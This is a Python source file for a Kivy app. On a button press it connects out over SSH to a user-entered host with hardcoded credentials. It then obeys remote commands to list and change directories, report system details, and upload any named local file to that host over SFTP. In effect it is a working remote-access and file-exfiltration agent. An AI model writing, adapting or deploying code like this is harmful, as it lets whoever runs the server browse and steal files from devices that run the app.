import os
import re
import threading

import paramiko

from kivy.app import App
from kivy.lang import Builder
from kivy.uix.boxlayout import BoxLayout


Builder.load_string('''
<Client>
    hostname: hostname

    BoxLayout:
        orientation: 'vertical'
        TextInput:
            id: hostname
            hint_text: 'Enter hostname'
        Button:
            text: 'Connect'
            on_press: root.connect()
''')


class Client(BoxLayout):

    def _connect(self, hostname, port=2222,
                 username='police', password='letmein'):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(hostname, port, username, password)
        chan = client.get_transport().open_session()

        while True:
            command = chan.recv(1024)

            if command == 'exit':
                chan.send('exit')
                chan.close()
                break
            elif command == 'pwd':
                chan.send(str(os.getcwd()))
            elif command == 'ls':
                dirs = os.listdir(os.getcwd())
                chan.send(str(dirs))
            elif 'cd' in command:
                try:
                    directory = re.match(r'^cd (.*)$', command).group(1)
                    os.chdir(directory)
                    chan.send(str(os.getcwd()))
                except:
                    chan.send('*** Error. Check directory')
            elif 'grab' in command:
                try:
                    path = re.match(r'^grab (.*)$', command).group(1)
                    threading.Thread(target=self._sftp,
                                     args=(path, chan)).start()
                except:
                    chan.send('*** Error. Check paths')
            elif command == 'uname':
                chan.send(str(os.uname()))
            else:
                chan.send('*** Unrecognized command')

    def _sftp(self, path, chan):
        try:
            with paramiko.Transport((self.hostname.text, 3373)) as transport:
                transport.connect(username='police', password='letmein')
                with paramiko.SFTPClient.from_transport(transport) as sftp:
                    sftp.put(path, path)
                    chan.send('Succesfully started copying')
        except OSError:
            chan.send('*** No such file or directory')
        except Exception as e:
            chan.send('*** Caught exception: %s: %s' % (e.__class__, e))

    def connect(self):
        t = threading.Thread(target=self._connect,
                             args=(self.hostname.text,))
        t.start()


class KivyClientApp(App):

    def build(self):
        return Client()


if __name__ == '__main__':
    KivyClientApp().run()
